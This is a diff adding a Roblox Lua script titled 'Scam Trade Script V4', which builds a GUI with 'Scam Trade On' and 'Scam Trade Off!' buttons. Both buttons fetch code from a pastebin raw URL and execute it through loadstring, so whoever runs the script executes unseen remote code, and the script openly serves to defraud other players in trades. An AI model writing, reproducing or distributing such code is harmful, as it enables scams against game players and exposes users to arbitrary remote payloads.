@@ -1,0 +1,68 @@
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local ScamTradeOff = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local ScamTradeOn = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(34, 159, 255)
+main.Position = UDim2.new(0.293374181, 0, 0.289502174, 0)
+main.Size = UDim2.new(0, 444, 0, 193)
+main.active = true
+main.draggable = true
+
+ScamTradeOff.Name = "ScamTradeOff"
+ScamTradeOff.Parent = main
+ScamTradeOff.BackgroundColor3 = Color3.fromRGB(255, 42, 0)
+ScamTradeOff.BorderColor3 = Color3.fromRGB(8, 11, 53)
+ScamTradeOff.Position = UDim2.new(0.272943735, 0, 0.678756475, 0)
+ScamTradeOff.Size = UDim2.new(0, 200, 0, 50)
+ScamTradeOff.Font = Enum.Font.Bangers
+ScamTradeOff.Text = "Scam Trade Off!"
+ScamTradeOff.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScamTradeOff.TextSize = 30.000
+ScamTradeOff.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/BhK6ihK8'))()
+end)
+
+UICorner.CornerRadius = UDim.new(0.300000012, 0)
+UICorner.Parent = ScamTradeOff
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(-0.0258307606, 0, -0.00227664411, 0)
+TextLabel.Size = UDim2.new(0, 443, 0, 50)
+TextLabel.Font = Enum.Font.LuckiestGuy
+TextLabel.Text = "Scam Trade Script V4"
+TextLabel.TextColor3 = Color3.fromRGB(0, 79, 79)
+TextLabel.TextSize = 38.000
+
+UICorner_2.CornerRadius = UDim.new(0.075000003, 0)
+UICorner_2.Parent = main
+
+ScamTradeOn.Name = "ScamTradeOn"
+ScamTradeOn.Parent = main
+ScamTradeOn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+ScamTradeOn.BorderColor3 = Color3.fromRGB(8, 11, 53)
+ScamTradeOn.Position = UDim2.new(0.272943735, 0, 0.326424897, 0)
+ScamTradeOn.Size = UDim2.new(0, 200, 0, 50)
+ScamTradeOn.Font = Enum.Font.Bangers
+ScamTradeOn.Text = "Scam Trade On"
+ScamTradeOn.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScamTradeOn.TextSize = 30.000
+ScamTradeOn.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/BhK6ihK8'))()
+end)
+
+
+UICorner_3.CornerRadius = UDim.new(0.075000003, 0)
+UICorner_3.Parent = ScamTradeOn
